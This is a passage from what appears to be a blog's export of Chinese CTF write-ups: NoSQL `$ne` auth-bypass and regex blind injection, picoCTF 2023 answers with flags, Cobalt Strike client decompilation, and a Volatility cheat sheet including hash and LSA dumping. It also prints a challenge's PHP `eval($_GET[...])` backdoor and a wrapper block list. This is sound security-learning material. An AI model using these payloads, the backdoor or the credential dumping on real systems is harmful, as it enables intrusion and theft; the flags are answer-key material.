class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;bohemian&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;657260&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>为一个数组，将此带到入到mongodb中为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.users.find(&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;bohemian&#x27;</span>, <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;657260&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>在mongodb中有一些条件操作符，</p><ul><li><p><code>$eq</code>: (equal)等于</p></li><li><p><code>$gt</code>：(greater than)大约</p></li><li><p><code>$gte</code>: (greater than equal)大约等于</p></li><li><p><code>$in</code>：等于数组中的某一项，{field:{$in:{value1,value2…}}}</p></li><li><p><code>$lt</code>：(less than)小于</p></li><li><p><code>$lte</code>：(less than equal)小于等于</p></li><li><p><code>$ne</code>：(not equal)不等于</p></li><li><p><code>$nin</code>：(not in)不等于数组中的任何一项</p><p>如</p></li></ul><p>//查询age = 22的记录</p><p>db.userInfo.find({“age”: 22});</p><p>//相当于：select * from userInfo where age = 22;</p><p>//查询age &gt; 22的记录</p><p>db.userInfo.find({age: {$gt: 22}});</p><p>//相当于：select * from userInfo where age &gt; 22;</p><p>如果当我们输入username[$ne]=1时，就会成为</p><p>username=array($ne=&gt;1)  == ‘username’:{$ne:1}</p><p>带入到mongodb中db.users.find({‘username’:{$ne:1}, ‘password’:{$ne:1}})</p><p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来进行盲注， <code>$regex</code> 可以达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> nosql </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF-2023-部分wp</title>
      <link href="/2023/03/27/CTFS/picoCTF-2023-%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/03/27/CTFS/picoCTF-2023-%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/2023picoctf/image-20230327161915650.png" alt="image-20230327161915650"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h4><p>访问页面，是一个登录的页面，账号密码<code>test/test!</code></p><p>抓包看到跳转到一个页面，</p><p>(/images/2023picoctf/image-20230327162639364.png)</p><p><img src="/images/2023picoctf/image-20230327162802078.png" alt="image-20230327162802078"></p><p>访问这个/next-page/id=cGljb0NURntwcm94aWVzX2Fs</p><p><img src="/images/2023picoctf/image-20230327162857583.png" alt="image-20230327162857583"></p><p>抓包，中间又会跳转一个页面，直接跳出来一个页面，看到有一个id，好像是base64，直接拼接</p><p><img src="/images/2023picoctf/image-20230327164821310.png" alt="image-20230327164821310"></p><p>flag:picoCTF{proxies_all_the_way_a0fe074f}</p><h4 id="chrono"><a href="#chrono" class="headerlink" title="chrono"></a>chrono</h4><p>How to automate tasks to run at intervals on linux servers?</p><p>机翻：如何自动执行任务以在 Linux 服务器上定期运行？</p><p>给了账号密码端口，直接连上去</p><p>定时任务的命令  crontab  ，执行crontab -l 发现没有，crontab的文件目录在/etc/下  以cron开头，</p><p><img src="/images/2023picoctf/image-20230327165914627.png" alt="image-20230327165914627"></p><p>在 challenge目录下也有flag</p><p><img src="/images/2023picoctf/image-20230327170454662.png" alt="image-20230327170454662"></p><p>flag:{“flag”: “picoCTF{Sch3DUL7NG_T45K3_L1NUX_1d781160}”, “username”: “picoplayer”, “password”: “dd4yT2bR</p><h4 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h4><p>Every file gets a flag.<br>The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what</p><p>机翻一下：每个文件都有一个标志。<br>SOC 分析师看到一张图像在两个人之间来回发送。 他们决定展开调查，发现事情远不止于此</p><p>直接下载一张图片</p><p>foremost 有一个zip包</p><p><img src="/images/2023picoctf/image-20230327173305594.png" alt="image-20230327173305594"></p><p><img src="/images/2023picoctf/image-20230327173324858.png" alt="image-20230327173324858"></p><p>ristretto flag.png</p><p><img src="/images/2023picoctf/image-20230327173335655.png" alt="image-20230327173335655"></p><p>flag:pIcoCTF{Hiddinng_An_imag3_within_@n_ima9e_96539bea}</p><h4 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h4><p>正则匹配</p><p>输入框输入东西，</p><p><img src="/images/2023picoctf/image-20230327204642026.png" alt="image-20230327204642026"></p><p>p开头 F结尾</p><table><thead><tr><th><a href="https://www.runoob.com/jsref/jsref-regexp-ncaret.html">^n</a></th><th>匹配任何开头为 n 的字符串。</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/images/2023picoctf/image-20230327204620651.png" alt="image-20230327204620651"></p><p>flag:picoCTF{succ3ssfully_matchtheregex_0694f25b}</p><h4 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h4><h4 id="money-ware"><a href="#money-ware" class="headerlink" title="money-ware"></a>money-ware</h4><p>Flag format: picoCTF{Malwarename}The first letter of the malware name should be capitalized and the rest lowercase.Your friend just got hacked and has been asked to pay some bitcoins to <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code>. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of?</p><p>标记格式：picoCTF{Malwarename}<br>恶意软件名称的首字母应大写，其余字母小写。<br>您的朋友刚刚被黑客入侵，并被要求向 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX 支付一些比特币。 他似乎不明白发生了什么，并向你征求意见。 你能确定他是哪种恶意软件的受害者吗？</p><p><img src="/images/2023picoctf/image-20230327222153657.png" alt="image-20230327222153657"></p><p>flag:picoCTF{Petya}</p><h4 id="repetitions"><a href="#repetitions" class="headerlink" title="repetitions"></a>repetitions</h4><p>下载文件，拖到ida</p><p><img src="/images/2023picoctf/image-20230327224136231.png" alt="image-20230327224136231"></p><p>base64 多解几次</p><p><img src="/images/2023picoctf/image-20230327224302506.png" alt="image-20230327224302506"></p><p>flag:picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_9b59b35c}</p><h4 id="rule"><a href="#rule" class="headerlink" title="rule"></a>rule</h4><p><img src="/images/2023picoctf/image-20230327224727627.png" alt="image-20230327224727627"></p><p>flag:picoCTF{h34rd_und3r5700d_4ck_cba1c711}</p><h4 id="FindAndOpen"><a href="#FindAndOpen" class="headerlink" title="FindAndOpen"></a>FindAndOpen</h4><p>下载pacp包，中间有个base解一下</p><p>这个是下面压缩包的密码</p><p>再解一下，就可以了</p><p><img src="/images/2023picoctf/image-20230328162924061.png" alt="image-20230328162924061"></p><p>picoCTF{R34DING_LOKd_fil56_succ3ss_419835ef}</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><p>直接拖到ida里</p><h3 id="safe-opener2"><a href="#safe-opener2" class="headerlink" title="safe opener2"></a>safe opener2</h3><p>直接拖到ida</p><h3 id="timer"><a href="#timer" class="headerlink" title="timer"></a>timer</h3><p>拖到Androidkill里</p><p>找到buildconfig文件即可</p><p><img src="/images/2023picoctf/image-20230328205729022.png" alt="image-20230328205729022"></p><p>flag:picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cs4.9.1二开</title>
      <link href="/2023/03/03/cs4-9-1%E4%BA%8C%E5%BC%80/cs4-9-1%E4%BA%8C%E5%BC%80/"/>
      <url>/2023/03/03/cs4-9-1%E4%BA%8C%E5%BC%80/cs4-9-1%E4%BA%8C%E5%BC%80/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\Java\jdk-17\bin\java.exe&quot; -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstrike-client.jar cs_src</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-XX:+AggressiveHeap -XX:+UseParallelGC</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2023</title>
      <link href="/2023/02/18/VNCTF2023/"/>
      <url>/2023/02/18/VNCTF2023/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="象棋王子"><a href="#象棋王子" class="headerlink" title="象棋王子"></a>象棋王子</h4><p>顾名思义，应该是下象棋的，我们可以下，太菜了，js直接翻<br><a href="http://236f7cc1-466c-4d47-abf8-21b4ffc92cf7.node4.buuoj.cn:81/js/play.js">http://236f7cc1-466c-4d47-abf8-21b4ffc92cf7.node4.buuoj.cn:81/js/play.js</a><br>在play.js中  下面有jsfuck</p><p><img src="/images/others/image-20230218114910836.png" alt="image-20230218114910836"></p><p><img src="/images/others/image-20230218114953833.png" alt="image-20230218114953833"></p><p>直接复制所有，到浏览器console中，即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>volatility常用命令</title>
      <link href="/2023/02/17/volatility%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/02/17/volatility%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4</span><br><span class="line">https://blog.csdn.net/u011250160/article/details/120473177</span><br></pre></td></tr></table></figure><h3 id="volatility2"><a href="#volatility2" class="headerlink" title="volatility2"></a>volatility2</h3><h4 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块 #"></a>常用模块 <a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97">#</a></h4><table><thead><tr><th><strong>插件名称</strong></th><th><strong>功能</strong></th></tr></thead><tbody><tr><td>amcache</td><td>查看AmCache应用程序痕迹信息</td></tr><tr><td>apihooks</td><td>检测内核及进程的内存空间中的API hook</td></tr><tr><td>atoms</td><td>列出会话及窗口站atom表</td></tr><tr><td>atomscan</td><td>Atom表的池扫描(Pool scanner)</td></tr><tr><td>auditpol</td><td>列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</td></tr><tr><td>bigpools</td><td>使用BigPagePoolScanner转储大分页池(big page pools)</td></tr><tr><td>bioskbd</td><td>从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</td></tr><tr><td>cachedump</td><td>获取内存中缓存的域帐号的密码哈希</td></tr><tr><td>callbacks</td><td>打印全系统通知例程</td></tr><tr><td>clipboard</td><td>提取Windows剪贴板中的内容</td></tr><tr><td>cmdline</td><td>显示进程命令行参数</td></tr><tr><td>cmdscan</td><td>提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）</td></tr><tr><td>connections</td><td>打印系统打开的网络连接(仅支持Windows XP 和2003)</td></tr><tr><td>connscan</td><td>打印TCP连接信息</td></tr><tr><td>consoles</td><td>提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）</td></tr><tr><td>crashinfo</td><td>提取崩溃转储信息</td></tr><tr><td>deskscan</td><td>tagDESKTOP池扫描(Poolscaner)</td></tr><tr><td>devicetree</td><td>显示设备树信息</td></tr><tr><td>dlldump</td><td>从进程地址空间转储动态链接库</td></tr><tr><td>dlllist</td><td>打印每个进程加载的动态链接库列表</td></tr><tr><td>driverirp</td><td>IRP hook驱动检测</td></tr><tr><td>drivermodule</td><td>关联驱动对象至内核模块</td></tr><tr><td>driverscan</td><td>驱动对象池扫描</td></tr><tr><td>dumpcerts</td><td>提取RAS私钥及SSL公钥</td></tr><tr><td>dumpfiles</td><td>提取内存中映射或缓存的文件</td></tr><tr><td>dumpregistry</td><td>转储内存中注册表信息至磁盘</td></tr><tr><td>editbox</td><td>查看Edit编辑控件信息 (Listbox正在实验中)</td></tr><tr><td>envars</td><td>显示进程的环境变量</td></tr><tr><td>eventhooks</td><td>打印Windows事件hook详细信息</td></tr><tr><td>evtlogs</td><td>提取Windows事件日志（仅支持XP/2003)</td></tr><tr><td>filescan</td><td>提取文件对象（file objects）池信息</td></tr><tr><td>gahti</td><td>转储用户句柄（handle）类型信息</td></tr><tr><td>gditimers</td><td>打印已安装的GDI计时器(timers)及回调(callbacks)</td></tr><tr><td>gdt</td><td>显示全局描述符表(Global Deor Table)</td></tr><tr><td>getservicesids</td><td>获取注册表中的服务名称并返回SID信息</td></tr><tr><td>getsids</td><td>打印每个进程的SID信息</td></tr><tr><td>handles</td><td>打印每个进程打开的句柄的列表</td></tr><tr><td>hashdump</td><td>转储内存中的Windows帐户密码哈希(LM/NTLM)</td></tr><tr><td>hibinfo</td><td>转储休眠文件信息</td></tr><tr><td>hivedump</td><td>打印注册表配置单元信息</td></tr><tr><td>hivelist</td><td>打印注册表配置单元列表</td></tr><tr><td>hivescan</td><td>注册表配置单元池扫描</td></tr><tr><td>hpakextract</td><td>从HPAK文件（Fast Dump格式）提取物理内存数据</td></tr><tr><td>hpakinfo</td><td>查看HPAK文件属性及相关信息</td></tr><tr><td>idt</td><td>显示中断描述符表(Interrupt Deor Table)</td></tr><tr><td>iehistory</td><td>重建IE缓存及访问历史记录</td></tr><tr><td>imagecopy</td><td>将物理地址空间导出原生DD镜像文件</td></tr><tr><td>imageinfo</td><td>查看/识别镜像信息</td></tr><tr><td>impscan</td><td>扫描对导入函数的调用</td></tr><tr><td>joblinks</td><td>打印进程任务链接信息</td></tr><tr><td>kdbgscan</td><td>搜索和转储潜在KDBG值</td></tr><tr><td>kpcrscan</td><td>搜索和转储潜在KPCR值</td></tr><tr><td>ldrmodules</td><td>检测未链接的动态链接DLL</td></tr><tr><td>lsadump</td><td>从注册表中提取LSA密钥信息（已解密）</td></tr><tr><td>machoinfo</td><td>转储Mach-O 文件格式信息</td></tr><tr><td>malfind</td><td>查找隐藏的和插入的代码</td></tr><tr><td>mbrparser</td><td>扫描并解析潜在的主引导记录(MBR)</td></tr><tr><td>memdump</td><td>转储进程的可寻址内存</td></tr><tr><td>memmap</td><td>打印内存映射</td></tr><tr><td>messagehooks</td><td>桌面和窗口消息钩子的线程列表</td></tr><tr><td>mftparser</td><td>扫描并解析潜在的MFT条目</td></tr><tr><td>moddump</td><td>转储内核驱动程序到可执行文件的示例</td></tr><tr><td>modscan</td><td>内核模块池扫描</td></tr><tr><td>modules</td><td>打印加载模块的列表</td></tr><tr><td>multiscan</td><td>批量扫描各种对象</td></tr><tr><td>mutantscan</td><td>对互斥对象池扫描</td></tr><tr><td>notepad</td><td>查看记事本当前显示的文本</td></tr><tr><td>objtypescan</td><td>扫描窗口对象类型对象</td></tr><tr><td>patcher</td><td>基于页面扫描的补丁程序内存</td></tr><tr><td>poolpeek</td><td>可配置的池扫描器插件</td></tr><tr><td>printkey</td><td>打印注册表项及其子项和值</td></tr><tr><td>privs</td><td>显示进程权限</td></tr><tr><td>procdump</td><td>进程转储到一个可执行文件示例</td></tr><tr><td>pslist</td><td>按照EPROCESS列表打印所有正在运行的进程</td></tr><tr><td>psscan</td><td>进程对象池扫描</td></tr><tr><td>pstree</td><td>以树型方式打印进程列表</td></tr><tr><td>psxview</td><td>查找带有隐藏进程的所有进程列表</td></tr><tr><td>qemuinfo</td><td>转储Qemu 信息</td></tr><tr><td>raw2dmp</td><td>将物理内存原生数据转换为windbg崩溃转储格式</td></tr><tr><td>screenshot</td><td>基于GDI Windows的虚拟屏幕截图保存</td></tr><tr><td>servicediff</td><td>Windows服务列表(ala Plugx)</td></tr><tr><td>sessions</td><td>_MM_SESSION_SPACE的详细信息列表(用户登录会话)</td></tr><tr><td>shellbags</td><td>打印Shellbags信息</td></tr><tr><td>shimcache</td><td>解析应用程序兼容性Shim缓存注册表项</td></tr><tr><td>shutdowntime</td><td>从内存中的注册表信息获取机器关机时间</td></tr><tr><td>sockets</td><td>打印已打开套接字列表</td></tr><tr><td>sockscan</td><td>TCP套接字对象池扫描</td></tr><tr><td>ssdt</td><td>显示SSDT条目</td></tr><tr><td>strings</td><td>物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</td></tr><tr><td>svcscan</td><td>Windows服务列表扫描</td></tr><tr><td>symlinkscan</td><td>符号链接对象池扫描</td></tr><tr><td>thrdscan</td><td>线程对象池扫描</td></tr><tr><td>threads</td><td>调查_ETHREAD 和_KTHREADs</td></tr><tr><td>timeliner</td><td>创建内存中的各种痕迹信息的时间线</td></tr><tr><td>timers</td><td>打印内核计时器及关联模块的DPC</td></tr><tr><td>truecryptmaster</td><td>恢复TrueCrypt 7.1a主密钥</td></tr><tr><td>truecryptpassphrase</td><td>查找并提取TrueCrypt密码</td></tr><tr><td>truecryptsummary</td><td>TrueCrypt摘要信息</td></tr><tr><td>unloadedmodules</td><td>打印卸载的模块信息列表</td></tr><tr><td>userassist</td><td>打印注册表中UserAssist相关信息</td></tr><tr><td>userhandles</td><td>转储用户句柄表</td></tr><tr><td>vaddump</td><td>转储VAD数据为文件</td></tr><tr><td>vadinfo</td><td>转储VAD信息</td></tr><tr><td>vadtree</td><td>以树形方式显示VAD树信息</td></tr><tr><td>vadwalk</td><td>显示遍历VAD树</td></tr><tr><td>vboxinfo</td><td>转储Virtualbox信息（虚拟机）</td></tr><tr><td>verinfo</td><td>打印PE镜像中的版本信息</td></tr><tr><td>vmwareinfo</td><td>转储VMware VMSS/VMSN 信息</td></tr><tr><td>volshell</td><td>内存镜像中的shell</td></tr><tr><td>windows</td><td>打印桌面窗口(详细信息)</td></tr><tr><td>wintree</td><td>Z顺序打印桌面窗口树</td></tr><tr><td>wndscan</td><td>池扫描窗口站</td></tr><tr><td>yarascan</td><td>以Yara签名扫描进程或内核内存</td></tr></tbody></table><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令 #"></a>常用命令 <a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">#</a></h3><table><thead><tr><th><strong>功能</strong></th><th><strong>命令行及参数</strong></th></tr></thead><tbody><tr><td>查看进程列表</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 pslist</td></tr><tr><td>查看进程列表（树形）</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 pstree</td></tr><tr><td>查看进程列表(psx视图)</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 psxview</td></tr><tr><td>查看网络通讯连接</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 netscan</td></tr><tr><td>查看加载的动态链接库</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 dlllist</td></tr><tr><td>查看SSDT表</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 ssdt</td></tr><tr><td>查看UserAssist痕迹</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 userassist</td></tr><tr><td>查看ShimCache痕迹</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 shimcache</td></tr><tr><td>查看ShellBags</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 shellbags</td></tr><tr><td>查看服务列表</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 svcscan</td></tr><tr><td>查看Windows帐户hash</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 hashdump</td></tr><tr><td>查看最后关机时间</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 shutdowntime</td></tr><tr><td>查看IE历史记录</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 iehistory</td></tr><tr><td>提取注册表数据</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 dumpregistry</td></tr><tr><td>解析MFT记录</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 mftparser</td></tr><tr><td>导出MFT记录,恢复文件</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 mftparser –output-file=mftverbose.txt -D mftoutput</td></tr><tr><td>获取TrueCrypt密钥信息</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 truecryptmaster</td></tr><tr><td>获取TrueCrypt密码信息</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 truecryptpassphras</td></tr></tbody></table><h4 id="Volatility3"><a href="#Volatility3" class="headerlink" title="Volatility3"></a>Volatility3</h4><p>banners.Banners<br>识别linux镜像的banner信息<br>不识别windows的镜像</p><p>isfinfo.IsfInfo<br>确定当前可用的ISF文件<br>具体什么是ISF文件，我也没查到<br>如下</p><p>layerwriter.LayerWriter<br>Runs the automagics and writes out the primary layer produced by the stacker.<br>运行 automagics 并写出堆栈器产生的主层</p><p>timeliner.Timeliner<br>Runs all relevant plugins that provide time related information and orders the results by time.<br>运行所有提供时间相关信息并按时间排序结果的相关插件，简称，全自动洗衣机</p><p>windows.cachedump.Cachedump<br>Dumps lsa secrets from memory<br>从内存中转储 lsa 密码<br>我这是转储失败了</p><p>windows.callbacks.Callbacks<br>Lists kernel callbacks and notification routines.<br>列出内核回调和通知例程</p><p>windows.cmdline.CmdLine<br>Lists process command line arguments.<br>列出进程命令行参数</p><p>windows.crashinfo.Crashinfo<br>windows.dlllist.DllList<br>Lists the loaded modules in a particular windows memory image.<br>列出加载的dll</p><p>windows.driverirp.DriverIrp<br>List IRPs for drivers in a particular windows memory image.<br>列出Windows 镜像中驱动程序的 IRP</p><p>windows.driverscan.DriverScan<br>Scans for drivers present in a particular windows memory image.<br>扫描存在于 Windows 镜像中的驱动程序</p><p>windows.dumpfiles.DumpFiles<br>Dumps cached file contents from Windows memory samples.<br>从 Windows 内存中转储缓存的文件内容，文件夹要爆了</p><p>windows.envars.Envars<br>Display process environment variables<br>显示进程环境变量</p><p>windows.filescan.FileScan<br>Scans for file objects present in a particular windows memory image.<br>扫描文件</p><p>windows.getservicesids.GetServiceSIDs<br>Lists process token sids.</p><p>windows.getsids.GetSIDs<br>Print the SIDs owning each process<br>列出每个进程的sid</p><p>windows.handles.Handles<br>Lists process open handles.<br>列出进程打开的句柄</p><p>windows.hashdump.Hashdump<br>Dumps user hashes from memory<br>获取哈希</p><p>windows.info.Info<br>Show OS &amp; kernel details of the memory sample being analyzed.<br>获取系统内核信息</p><p>windows.lsadump.Lsadump<br>Dumps lsa secrets from memory<br>从内存中转储 lsa 密码<br>和cachedump一样的解释，但是执行的结果却不一样</p><p>windows.malfind.Malfind<br>Lists process memory ranges that potentially contain injected code.<br>列出可能包含注入代码的进程内存范围</p><p>windows.memmap.Memmap<br>Prints the memory map<br>打印内存映射</p><p>windows.modscan.ModScan<br>Scans for modules present in a particular windows memory image.<br>扫描 Windows 内存映像中存在的模块</p><p>windows.modules.Modules<br>Lists the loaded kernel modules.<br>列出加载的内核模块</p><p>windows.mutantscan.MutantScan<br>Scans for mutexes present in a particular windows memory image.<br>扫描特定 Windows 内存映像中存在的互斥锁，游戏多开用的就是mutex</p><p>windows.netscan.NetScan<br>Scans for network objects present in a particular windows memory image.<br>扫描存在于 Windows 内存映像中的网络对象</p><p>windows.netstat.NetStat<br>Traverses network tracking structures present in a particular windows memory image.<br>遍历 Windows 内存映像中存在的网络状态<br>就像执行了netstat -ano 一样</p><p>windows.poolscanner.PoolScanner<br>A generic pool scanner plugin.</p><p>windows.privileges.Privs<br>Lists process token privileges</p><p>windows.pslist.PsList<br>Lists the processes present in a particular windows memory image.</p><p>windows.psscan.PsScan<br>Scans for processes present in a particular windows memory image.<br>就像在linux中执行了ps一样</p><p>windows.pstree.PsTree<br>Plugin for listing processes in a tree based on their parent process ID.<br>根据父进程 ID 在树中列出进程的插件<br>反正我是没有看出来树形结构体现在哪</p><p>windows.registry.certificates.Certificates<br>Lists the certificates in the registry’s Certificate Store.<br>列出注册表的证书存储中的证书</p><p>windows.registry.hivelist.HiveList<br>Lists the registry hives present in a particular memory image.<br>列出内存映像中存在的注册表配置</p><p>windows.registry.hivescan.HiveScan<br>Scans for registry hives present in a particular windows memory image.<br>扫描 windows 中存在的注册表配置单元</p><p>windows.registry.printkey.PrintKey<br>Lists the registry keys under a hive or specific key value.<br>列出配置单元或特定键值下的注册表项</p><p>windows.registry.userassist.UserAssist<br>Print userassist registry keys and information.<br>打印 userassist 注册表项和信息</p><p>windows.skeleton_key_check.Skeleton_Key_Check<br>Looks for signs of Skeleton Key malware<br>寻找 Skeleton Key 恶意软件的迹象</p><p>windows.ssdt.SSDT<br>Lists the system call table.<br>列出系统调用表</p><p>windows.statistics.Statistics<br>统计数据</p><p>windows.strings.Strings<br>Reads output from the strings command and indicates which process(es) each string belongs to.<br>读取 strings 命令的输出并指示每个字符串属于哪个进程<br>已尽力，卒。</p><p>windows.svcscan.SvcScan<br>Scans for windows services.<br>服务扫描</p><p>windows.symlinkscan.SymlinkScan<br>Scans for links present in a particular windows memory image.<br>扫描存在于 Windows 内存映像中的链接</p><p>windows.vadinfo.VadInfo<br>Lists process memory ranges.<br>列出进程内存范围</p><p>windows.verinfo.VerInfo<br>Lists version information from PE files.<br>列出 PE 文件的版本信息</p><p>windows.virtmap.VirtMap<br>Lists virtual mapped sections.<br>列出虚拟映射section</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Round#8</title>
      <link href="/2023/02/11/CTFS/NSSCTF-Round-8/"/>
      <url>/2023/02/11/CTFS/NSSCTF-Round-8/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="MyDoor"><a href="#MyDoor" class="headerlink" title="MyDoor"></a>MyDoor</h4><p><a href="http://43.142.108.3:28348/index.php?file=">http://43.142.108.3:28348/index.php?file=</a><br>这里应该是文件读取，直接、etc/passwd 正常，index.php没有读取到，那伪协议获取源码<br>PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCg0KaWYgKGlzc2V0KCRfR0VUWydOX1MuUyddKSkgew0KICAgIGV2YWwoJF9HRVRbJ05fUy5TJ10pOw0KfQ0KDQppZighaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpIHsNCiAgICBoZWFkZXIoJ0xvY2F0aW9uOi9pbmRleC5waHA/ZmlsZT0nKTsNCn0gZWxzZSB7DQogICAgJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KDQogICAgaWYgKCFwcmVnX21hdGNoKCcvXC5cLnxsYXxkYXRhfGlucHV0fGdsb2J8Z2xvYmFsfHZhcnxkaWN0fGdvcGhlcnxmaWxlfGh0dHB8cGhhcnxsb2NhbGhvc3R8XD98XCp8XH58emlwfDd6fGNvbXByZXNzL2lzJywgJGZpbGUpKSB7DQogICAgICAgIGluY2x1ZGUgJGZpbGU7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZGllKCdlcnJvci4nKTsNCiAgICB9DQp9</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span 